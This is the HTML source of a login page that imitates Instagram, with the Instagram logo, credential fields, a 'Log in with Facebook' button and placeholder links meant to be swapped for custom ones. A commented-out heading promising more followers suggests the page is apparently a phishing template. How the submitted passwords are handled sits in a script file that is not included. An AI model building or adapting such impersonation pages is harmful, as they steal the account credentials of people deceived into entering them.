<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="styles.css">
<title>Login Page</title>
</head>
<body>
  <div class="login-container">
    <!-- <img src="download.jpeg" alt="Logo"> -->
    <img src="Instagram.png" alt="Logo">
    <!-- <h4>Increase Your Followers. Please Log into Your Account</h4> -->
    <form id="loginForm">
      <div class="form-group">
        <input type="text" id="username" placeholder=" " required>
        <label for="username">Phone number, username, or email</label>
      </div>
      <div class="form-group">
        <input type="password" id="password" placeholder=" " required>
        <label for="password">Password</label>
        <span class="show-password" onclick="togglePassword()">Show</span>
      </div>
      <input type="submit" value="Log in">
    </form>
    <br>
    <div style="display: flex; align-items: center;">
      <div style="flex-grow: 1; height: 1px; background-color: #ccc;"></div>
      <span style="margin: 0 10px; color: #777;font-size: 12px;">OR</span>
      <div style="flex-grow: 1; height: 1px; background-color: #ccc;"></div>
    </div>
    <br>
    <br>
    <button class="social-button facebook-button" onclick="window.location.href='YOUR_CUSTOM_FACEBOOK_LOGIN_LINK';">
      <img src="facebook.png" alt="Facebook Logo"> Log in with Facebook
    </button>
    
    <a href="YOUR_CUSTOM_FORGOT_PASSWORD_LINK" class="social-button forgot-password-button">Forgot password?</a>

  </div>
  <div class="signup-container">

  </div>
<script src="script.js"></script>
</body>
</html>
